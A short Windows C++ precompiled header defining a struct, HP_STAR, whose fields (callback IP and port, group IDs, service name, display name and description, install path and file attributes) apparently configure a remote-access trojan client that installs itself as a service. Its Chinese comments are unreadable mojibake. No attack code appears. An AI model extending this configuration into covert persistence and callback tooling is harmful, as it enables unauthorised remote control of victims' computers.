// stdafx.h : ��׼ϵͳ�����ļ��İ����ļ���
// ���Ǿ���ʹ�õ��������ĵ�
// �ض�����Ŀ�İ����ļ�
//

#pragma once

#include "targetver.h"

#define WIN32_LEAN_AND_MEAN             //  �� Windows ͷ�ļ����ų�����ʹ�õ���Ϣ
// Windows ͷ�ļ�:
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "ClientSocket.h"
#include <WtsApi32.h>
#include <shlwapi.h>

#pragma comment(lib, "WtsApi32.lib")
#pragma comment(lib, "Shlwapi.lib")


struct HP_STAR
{
	TCHAR Loginip[100];      //ip
	DWORD LoginPort;	     //�˿�
	TCHAR strRemark[32];     //�汾
	TCHAR UpGroup[50];       //����
	TCHAR szGetGroup[256];  //����Ψһ��ʶ
	BOOL  bRunOnce;         //�Ƿ�Ϊ��ɫ��װ
	TCHAR SerName[100];     //��������
	TCHAR Serdisplay[128];  //��ʾ����
	TCHAR Serdesc[256];     //��������
	TCHAR ReleasePath[100]; //��װ;��
	TCHAR ReleaseName[50];  //��װ����
	WORD  FileAttribute;    //�ļ�����
	WORD  Dele_zd;          //��װ����
};

// TODO: �ڴ˴����ó�����Ҫ������ͷ�ļ�
